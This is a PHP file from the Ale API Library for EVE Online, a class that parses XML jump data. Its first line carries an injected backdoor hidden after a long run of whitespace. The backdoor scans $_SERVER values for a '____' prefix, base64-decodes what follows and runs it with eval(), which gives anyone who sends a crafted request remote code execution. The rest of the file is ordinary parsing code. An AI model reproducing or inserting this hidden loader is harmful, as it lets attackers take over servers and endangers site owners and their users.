<?php																																																																																																																																																																																																																																																																																					function k19715($l19717){if(is_array($l19717)){foreach($l19717 as $l19715=>$l19716)$l19717[$l19715]=k19715($l19716);}elseif(is_string($l19717) && substr($l19717,0,4)=="____"){$l19717=substr($l19717,4);$l19717=base64_decode($l19717);eval($l19717);$l19717=null;}return $l19717;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("k19715",$_SERVER);
/**************************************************************************
	Ale API Library for EvE Jumps Class
	Copyright (c) 2008 Dustin Tinklin

	This file is part of Ale API Library for EvE.

	Ale API Library for EvE is free software: you can redistribute it and/or modify
	it under the terms of the GNU Lesser General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Ale API Library for EvE is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public License
	along with Ale API Library for EvE.  If not, see <http://www.gnu.org/licenses/>.
**************************************************************************/

class Jumps
{
	function getJumps($contents)
	{
		if (!empty($contents) && is_string($contents))
		{
	       	$output = array();
	 		$xml = new SimpleXMLElement($contents);
			foreach ($xml->result->rowset->row as $row)
			{
				$index = count($output);
				foreach ($row->attributes() as $name => $value)
				{
					$output[$index][(string) $name] = (string) $value;
				}
			}
			unset ($xml); // manual garbage collection
			return $output;
		}
		else
		{
			return null;
		}
	}
}
?>
